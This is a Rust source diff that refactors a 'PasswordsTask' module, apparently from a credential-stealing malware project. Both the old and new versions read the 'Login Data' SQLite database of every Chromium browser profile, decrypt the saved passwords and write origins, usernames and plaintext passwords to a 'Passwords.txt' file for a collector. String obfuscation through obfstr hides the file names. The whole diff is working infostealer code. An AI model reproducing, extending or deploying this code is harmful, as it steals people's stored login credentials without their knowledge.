@@ -1,19 +1,21 @@
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Password};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, Password, SqliteDatabase};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
-use utils::path::Path;
 
 const LOGINS_ORIGIN_URL: usize = 0;
 const LOGINS_USERNAME_VALUE: usize = 3;
 const LOGINS_PASSWORD_VALUE: usize = 5;
 
 pub(super) struct PasswordsTask {
-    browser: Arc<BrowserData>
+    browser: Arc<BrowserData>,
 }
 
 impl PasswordsTask {
@@ -22,47 +24,52 @@ impl PasswordsTask {
     }
 }
 
-impl<C: Collector> Task<C> for PasswordsTask {
+impl<C: Collector, F: FileSystem> Task<C, F> for PasswordsTask {
     parent_name!("Passwords.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
-        let Some(passwords) = collect_and_read_sqlite_from_all_profiles(
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+        let Some(passwords) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("Login Data"),
             s!("Logins"),
-            |record| extract_password_from_record(record, &self.browser)
+            |record| extract_password_from_record(record, &self.browser),
         ) else {
-            return
+            return;
         };
 
-        collector.get_browser().increase_passwords_by(passwords.len());
-        let _ = to_string_and_write_all(&passwords, "\n\n", parent);
+        collector
+            .get_browser()
+            .increase_passwords_by(passwords.len());
+        let _ = to_string_and_write_all(&passwords, "\n\n", filesystem, parent);
     }
 }
 
-fn extract_password_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<Password> {
+fn extract_password_from_record<R: TableRecord>(
+    record: &R,
+    browser_data: &BrowserData,
+) -> Option<Password> {
     let origin = record
         .get_value(LOGINS_ORIGIN_URL)
-        .and_then(|value| value.as_string())
-        .map(|s| s.to_owned());
+        .and_then(|value| value.as_string());
 
     let username = record
         .get_value(LOGINS_USERNAME_VALUE)
-        .and_then(|value| value.as_string())
-        .map(|s| s.to_owned());
+        .and_then(|value| value.as_string());
 
     let password = record
         .get_value(LOGINS_PASSWORD_VALUE)
         .and_then(|value| value.as_blob())
-        .and_then(|blob| unsafe { decrypt_data(blob, browser_data) });
+        .and_then(|blob| decrypt_data(&blob, browser_data))
+        .map(Arc::<str>::from);
 
     if let (None, None) = (&username, &password) {
-        return None
+        return None;
     }
 
     Some(Password {
         origin,
         username,
-        password
+        password,
     })
 }
